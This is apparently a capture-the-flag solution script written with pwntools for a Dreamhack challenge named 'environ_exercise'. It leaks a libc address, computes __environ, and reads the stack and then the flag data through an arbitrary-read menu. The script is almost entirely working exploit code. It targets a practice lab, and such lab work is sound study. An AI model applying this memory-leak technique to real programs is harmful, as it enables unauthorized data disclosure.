#!/usr/bin/env python3
from pwn import *

elf = ELF('./environ_exercise')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# p = elf.process()
# gdb.attach(p, '''
# 	b *main+123
# 	''')
libc = ELF('./libc/libc6-amd64_2.27-3ubuntu1.4_i386.so')
p = remote('host3.dreamhack.games', '22946')

p.recvuntil(b": ")
stdout = int(p.recvuntil(b"\n"),16)
# 0x7f7016e78760 | _IO_2_1_stdout_ | server
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
libc_environ = libc_base + libc.symbols['__environ']
print(hex(libc_base))
print(hex(libc_environ))


p.sendlineafter(b">", b"1")
p.sendlineafter(b":", str(libc_environ).encode())
p.recv(1)
stack_environ = u64(p.recv(6).ljust(8, b"\x00")) 
# 0x7fffffffc780
# /home/environ_exercise/flag
# 0x1538 - server 
stack_flag = stack_environ - 0x1548 
log.info("stack_environ: " + hex(stack_environ))
log.info("stack_flag: " + hex(stack_flag))
p.sendlineafter(b">", b"1")
p.sendlineafter(b":", str(stack_flag).encode())

leak = p.recvline()
print(leak)


p.interactive()

